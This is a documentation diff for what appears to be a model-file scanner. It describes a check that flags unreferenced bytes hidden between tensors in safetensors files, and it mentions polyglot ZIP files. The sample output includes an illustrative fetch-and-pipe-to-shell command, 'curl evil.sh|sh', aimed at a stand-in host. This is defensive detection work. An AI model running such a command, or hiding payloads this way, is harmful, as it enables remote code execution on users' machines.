@@ -277,6 +277,37 @@ tensor B :       [2 ─────── 6]        ← B starts before A ends
                  ST_OFFSET_OVERLAP
 ```
 
+And the check that valid offsets alone do **not** give you: every byte of the
+data segment must belong to a tensor.
+
+```
+declared : [ tensor a ]              [ tensor b ]
+file     : [ tensor a ][ ??? 64 B ???][ tensor b ]
+                       ▲
+                       claimed by nobody, read by nobody,
+                       not covered by the manifest hash
+                       -> ST_UNREFERENCED_BYTES
+```
+
+Every offset above is in bounds, ordered, and non-overlapping. The file is
+valid. It also carries 64 bytes of whatever the author wanted. `assay` reports
+the region with its absolute offsets and an escaped preview, and raises the
+severity to high when those bytes start with a recognizable signature:
+
+```
+[high] ST_UNREFERENCED_BYTES: 64 byte(s) between tensors belong to no tensor
+       (file offset 149) and begin with an ELF executable signature; ...
+    - file offsets 149..213
+    - first bytes: \x7fELFcurl evil.sh|sh\x00\x00\x00...
+```
+
+Zero-filled holes are reported too, at `low`: they are consistent with
+alignment padding, so they do not condemn the file, but you still get told the
+manifest hash does not cover them. The same accounting catches anything
+appended after the last tensor, which is how a file gets to be a valid
+safetensors *and* a valid ZIP at the same time.
+
+
 ---
 
 ### 2.4 GGUF sanity + chat-template flagging
